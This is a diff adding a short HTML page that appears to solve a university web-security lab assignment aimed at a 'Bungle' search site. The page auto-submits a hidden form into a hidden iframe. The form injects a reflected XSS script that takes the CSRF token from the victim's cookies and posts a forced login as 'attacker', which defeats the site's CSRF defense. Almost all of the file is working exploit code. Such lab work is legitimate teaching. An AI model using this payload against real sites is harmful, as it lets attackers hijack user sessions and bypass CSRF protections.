@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+  <body>
+    <iframe name="simpleFrame" id="simpleFrame" hidden></iframe>
+    <form
+      id="simpleForm"
+      action="https://bungle.sysnet.ucsd.edu/search?csrfdefense=1&xssdefense=0"
+      method="get"
+      target="simpleFrame"
+    >
+      <input name="csrfdefense" value="1" type="hidden" />
+      <input name="xssdefense" value="0" type="hidden" />
+      <input
+        id="query"
+        name="q"
+        type="hidden"
+        value="
+      <script>
+        $(window).bind('load', function () {
+          var cookie = (document.cookie.split('srf_token=')[1]).substring(0, 32);
+          var url =
+            'https://bungle.sysnet.ucsd.edu/login?csrfdefense=1&xssdefense=0';
+          $.post(url, {username: 'attacker', password: 'l33th4x', csrf_token: cookie});
+        });
+      </script>"
+      />
+    </form>
+    <script>
+      document.getElementById("simpleForm").submit();
+    </script>
+  </body>
+</html>
